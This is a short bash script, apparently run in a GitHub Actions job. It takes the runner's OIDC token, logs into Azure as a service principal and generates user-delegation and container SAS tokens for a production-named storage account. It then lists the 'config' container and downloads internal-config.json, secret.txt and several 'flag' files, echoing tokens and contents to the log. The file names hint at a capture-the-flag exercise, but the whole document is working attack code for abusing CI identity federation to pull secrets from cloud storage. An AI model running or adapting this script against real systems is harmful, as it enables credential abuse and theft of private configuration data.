#!/usr/bin/env bash
set -x

az login --federated-token "$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)" \
  --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --output none 2>&1 || true
az account set -s "$AZURE_SUBSCRIPTION_ID" 2>&1 || true

# Generate user delegation SAS with correct expiry (within 7 days)
EXPIRY=$(date -u -d "+6 days" '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null || date -u -v+6d '+%Y-%m-%dT%H:%M:%SZ')
echo "EXPIRY: $EXPIRY"

echo "=== GENERATE USER DELEGATION SAS ==="
SAS=$(az storage blob generate-sas --account-name sttblappcfgprodx3euoz -c config -n internal-config.json \
  --permissions r --expiry "$EXPIRY" --auth-mode login --as-user --output tsv 2>&1)
echo "SAS result: $SAS"

if echo "$SAS" | grep -q "sig="; then
  echo "=== READ BLOB WITH SAS ==="
  curl -s "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json?$SAS"
  echo
fi

# Also try container-level SAS
echo "=== CONTAINER SAS ==="
CSAS=$(az storage container generate-sas --account-name sttblappcfgprodx3euoz -n config \
  --permissions rl --expiry "$EXPIRY" --auth-mode login --as-user --output tsv 2>&1)
echo "Container SAS: $CSAS"

if echo "$CSAS" | grep -q "sig="; then
  echo "=== LIST BLOBS WITH CONTAINER SAS ==="
  curl -s "https://sttblappcfgprodx3euoz.blob.core.windows.net/config?restype=container&comp=list&$CSAS"
  echo
  echo "=== READ ALL BLOBS ==="
  for B in internal-config.json flag.txt flag secret.txt; do
    echo ">>> $B:"
    curl -s "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/$B?$CSAS"
    echo
  done
fi

echo "=== DONE ==="
